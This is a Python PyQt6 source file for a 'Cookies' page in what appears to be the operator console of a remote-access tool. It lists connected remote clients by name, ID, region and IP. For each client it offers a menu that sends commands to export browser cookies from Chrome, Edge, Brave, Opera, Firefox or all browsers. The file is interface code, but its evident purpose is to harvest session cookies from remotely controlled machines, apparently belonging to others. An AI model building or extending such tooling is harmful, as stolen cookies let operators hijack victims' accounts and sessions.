from PyQt6 import QtCore, QtGui, QtWidgets

from ...core.api import RemoteControllerApi
from ...core.i18n import I18n
from ...core.settings import SettingsStore
from ...core.theme import THEMES
from ..common import GlassFrame, load_icon, make_button
from .dashboard import ClientFetchWorker


class CookiesPage(QtWidgets.QWidget):
    extra_action_requested = QtCore.pyqtSignal(str, str)
    client_selected = QtCore.pyqtSignal(str)

    def __init__(
        self,
        i18n: I18n,
        settings: SettingsStore,
        api: RemoteControllerApi | None = None,
    ):
        super().__init__()
        self.i18n = i18n
        self.settings = settings
        self.api = api
        self.clients: list[dict] = []
        self.theme = THEMES.get(self.settings.get("theme", "dark"), THEMES["dark"])
        self._fetch_worker: ClientFetchWorker | None = None

        layout = QtWidgets.QVBoxLayout(self)
        layout.setSpacing(14)
        layout.setContentsMargins(0, 0, 0, 0)

        toolbar = GlassFrame(radius=18, tone="card_alt", tint_alpha=160, border_alpha=70)
        toolbar.setObjectName("ToolbarCard")
        toolbar_layout = QtWidgets.QHBoxLayout(toolbar)
        toolbar_layout.setContentsMargins(16, 14, 16, 14)
        toolbar_layout.setSpacing(12)

        title_box = QtWidgets.QVBoxLayout()
        self.title_label = QtWidgets.QLabel()
        self.title_label.setObjectName("PageTitle")
        self.subtitle_label = QtWidgets.QLabel()
        self.subtitle_label.setObjectName("PageSubtitle")
        title_box.addWidget(self.title_label)
        title_box.addWidget(self.subtitle_label)
        toolbar_layout.addLayout(title_box)
        toolbar_layout.addStretch()

        self.search_input = QtWidgets.QLineEdit()
        self.search_input.setObjectName("SearchInput")
        self.search_input.setMinimumWidth(240)
        self.search_input.setClearButtonEnabled(True)
        search_icon = load_icon("search", self.theme.name)
        if not search_icon.isNull():
            self.search_input.addAction(
                search_icon,
                QtWidgets.QLineEdit.ActionPosition.LeadingPosition,
            )
        self.search_input.textChanged.connect(self.filter_clients)
        toolbar_layout.addWidget(self.search_input)

        self.refresh_button = make_button("", "ghost")
        self.refresh_button.clicked.connect(self.refresh_clients)
        toolbar_layout.addWidget(self.refresh_button)

        layout.addWidget(toolbar)

        self.table_card = GlassFrame(radius=20, tone="card", tint_alpha=170, border_alpha=70)
        self.table_card.setObjectName("Card")
        table_layout = QtWidgets.QVBoxLayout(self.table_card)
        table_layout.setContentsMargins(12, 12, 12, 12)
        table_layout.setSpacing(8)
        self.table = QtWidgets.QTableWidget(0, 5)
        self.table.verticalHeader().setVisible(False)
        self.table.setAlternatingRowColors(True)
        self.table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
        self.table.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarPolicy.ScrollBarAsNeeded)
        self.table.setMouseTracking(True)
        self.table.setShowGrid(False)
        header_view = self.table.horizontalHeader()
        header_view.setSectionResizeMode(0, QtWidgets.QHeaderView.ResizeMode.Stretch)
        header_view.setSectionResizeMode(1, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
        header_view.setSectionResizeMode(2, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
        header_view.setSectionResizeMode(3, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
        header_view.setSectionResizeMode(4, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
        self.table.verticalHeader().setDefaultSectionSize(46)
        self.table.cellDoubleClicked.connect(self._emit_client_selected)
        table_layout.addWidget(self.table)
        layout.addWidget(self.table_card, 1)

        self.apply_translations()
        self.refresh_from_settings()

    def apply_translations(self) -> None:
        self.title_label.setText(self.i18n.t("cookies_title"))
        self.subtitle_label.setText(self.i18n.t("cookies_subtitle"))
        self.search_input.setPlaceholderText(self.i18n.t("cookies_search_placeholder"))
        self.refresh_button.setText(self.i18n.t("main_refresh_button"))
        self.table.setHorizontalHeaderLabels(
            [
                self.i18n.t("table_name"),
                self.i18n.t("table_id"),
                self.i18n.t("table_region"),
                self.i18n.t("table_ip"),
                self.i18n.t("table_cookies"),
            ]
        )

    def refresh_from_settings(self) -> None:
        self.clients = list(self.settings.get("clients", []) or [])
        self.render_clients(self.clients)

    def refresh_clients(self) -> None:
        if not self.api:
            self.refresh_from_settings()
            return
        if self._fetch_worker and self._fetch_worker.isRunning():
            return
        self._fetch_worker = ClientFetchWorker(self.api)
        self._fetch_worker.fetched.connect(self._handle_clients_fetched)
        self._fetch_worker.failed.connect(self._handle_clients_failed)
        self._fetch_worker.start()

    def _handle_clients_fetched(self, clients: list) -> None:
        self.clients = list(clients or [])
        self.settings.set("clients", self.clients)
        self.settings.save()
        self.render_clients(self.clients)

    def _handle_clients_failed(self, _message: str) -> None:
        self.refresh_from_settings()

    def filter_clients(self, text: str) -> None:
        text = text.lower().strip()
        if not text:
            self.render_clients(self.clients)
            return
        filtered: list[dict] = []
        for client in self.clients:
            values = [
                client.get("name", ""),
                client.get("id", ""),
                client.get("ip", ""),
                self._resolve_region_display(client),
            ]
            if any(text in str(value).lower() for value in values):
                filtered.append(client)
        self.render_clients(filtered)

    def _resolve_region_display(self, client: dict) -> str:
        region_value = str(client.get("region") or "").strip()
        if region_value:
            return self.i18n.t(region_value)
        return "--"

    def render_clients(self, clients: list[dict]) -> None:
        self.table.setRowCount(0)
        for client in clients:
            row = self.table.rowCount()
            self.table.insertRow(row)
            self.table.setRowHeight(row, 46)
            name_item = QtWidgets.QTableWidgetItem(client.get("name", ""))
            name_item.setData(QtCore.Qt.ItemDataRole.UserRole, client.get("id"))
            id_item = QtWidgets.QTableWidgetItem(client.get("id", ""))
            region_item = QtWidgets.QTableWidgetItem(self._resolve_region_display(client))
            ip_item = QtWidgets.QTableWidgetItem(client.get("ip", ""))
            for item in (name_item, id_item, region_item, ip_item):
                item.setFlags(item.flags() & ~QtCore.Qt.ItemFlag.ItemIsEditable)
            self.table.setItem(row, 0, name_item)
            self.table.setItem(row, 1, id_item)
            self.table.setItem(row, 2, region_item)
            self.table.setItem(row, 3, ip_item)

            export_button = make_button(self.i18n.t("button_cookies_export"), "ghost")
            menu = QtWidgets.QMenu(export_button)
            cookie_actions = [
                ("all", self.i18n.t("menu_cookies_all")),
                ("chrome", self.i18n.t("menu_cookies_chrome")),
                ("edge", self.i18n.t("menu_cookies_edge")),
                ("brave", self.i18n.t("menu_cookies_brave")),
                ("opera", self.i18n.t("menu_cookies_opera")),
                ("firefox", self.i18n.t("menu_cookies_firefox")),
            ]
            for key, label in cookie_actions:
                action = menu.addAction(label)
                action.triggered.connect(
                    lambda _, cid=client.get("id", ""), browser=key: self.extra_action_requested.emit(
                        cid, f"cookies:{browser}"
                    )
                )
            export_button.setMenu(menu)
            self.table.setCellWidget(row, 4, export_button)

    def _emit_client_selected(self, row: int, _column: int) -> None:
        item = self.table.item(row, 0)
        if not item:
            return
        client_id = item.data(QtCore.Qt.ItemDataRole.UserRole)
        if client_id:
            self.client_selected.emit(client_id)
